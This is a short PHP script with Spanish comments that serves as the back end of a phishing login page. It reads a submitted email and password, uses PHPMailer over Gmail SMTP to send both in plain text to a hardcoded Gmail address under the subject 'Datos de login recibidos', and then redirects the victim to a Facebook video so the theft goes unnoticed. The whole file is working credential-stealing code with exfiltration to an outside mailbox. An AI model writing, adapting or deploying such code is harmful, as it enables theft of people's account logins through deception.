<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recupera los datos del formulario
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Crear una instancia de PHPMailer
    $mail = new PHPMailer(true);

    try {
        // Configuración del servidor SMTP de Gmail
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'your_email@gmail.com'; // Tu correo de Gmail
        $mail->Password = 'your_password'; // Tu contraseña de Gmail (o App Password si tienes 2FA habilitado)
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;

        // Remitente y destinatario
        $mail->setFrom('noreply@example.com', 'Mailer');
        $mail->addAddress('alvaro.alinoah@gmail.com'); // Añadir un destinatario

        // Contenido del correo
        $mail->isHTML(true);
        $mail->Subject = 'Datos de login recibidos';
        $mail->Body    = "Correo electrónico: " . htmlspecialchars($email) . "<br>Contraseña: " . htmlspecialchars($password);
        $mail->AltBody = "Correo electrónico: " . htmlspecialchars($email) . "\nContraseña: " . htmlspecialchars($password);

        // Enviar el correo
        $mail->send();
        // Redireccionar después de enviar el correo
        header('Location: https://www.facebook.com/poemas.poesiasfrases/videos/604349698114119');
        exit();
    } catch (Exception $e) {
        echo "Error al enviar el correo: {$mail->ErrorInfo}";
    }
}
?>

